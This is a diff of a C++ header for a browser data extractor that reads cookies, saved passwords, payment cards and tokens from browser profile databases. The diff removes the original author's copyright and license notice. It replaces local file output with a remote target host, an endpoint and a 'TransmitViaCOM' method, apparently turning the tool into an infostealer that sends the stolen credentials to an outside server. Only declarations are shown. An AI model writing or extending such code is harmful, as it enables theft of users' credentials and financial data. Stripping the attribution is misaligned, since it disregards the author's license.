@@ -1,42 +1,36 @@
-// (c) Alexander 'xaitax' Hagenah
-// Licensed under the MIT License. See LICENSE file in the project root for full license information.
-
 #pragma once
-
 #include "../core/common.hpp"
 #include "pipe_client.hpp"
 #include "../../libs/sqlite/sqlite3.h"
 #include <vector>
 #include <string>
+#include <windows.h>
+#include <comdef.h>
 
 namespace Payload {
-
     class DataExtractor {
     public:
-        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase);
-
+        // Match this exactly in your .cpp
+        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint);
         void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);
 
     private:
         sqlite3* OpenDatabase(const std::filesystem::path& dbPath);
-
         sqlite3* OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath);
-
         void CleanupTempFiles();
-
-        void ExtractCookies(sqlite3* db, const std::filesystem::path& outFile);
-        void ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile);
-        void ExtractCards(sqlite3* db, const std::filesystem::path& outFile);
-        void ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile);
-        void ExtractTokens(sqlite3* db, const std::filesystem::path& outFile);
-
+        
+        void ExtractCookies(sqlite3* db);
+        void ExtractPasswords(sqlite3* db);
+        void ExtractCards(sqlite3* db);
+        void ExtractTokens(sqlite3* db);
+        
+        void TransmitViaCOM(const std::string& data); // Added this
         std::string EscapeJson(const std::string& s);
 
         PipeClient& m_pipe;
         std::vector<uint8_t> m_key;
-        std::filesystem::path m_outputBase;
-
+        std::wstring m_targetHost; // Ensure these members exist
+        std::wstring m_endpoint;
         std::vector<std::filesystem::path> m_tempFiles;
     };
-
 }
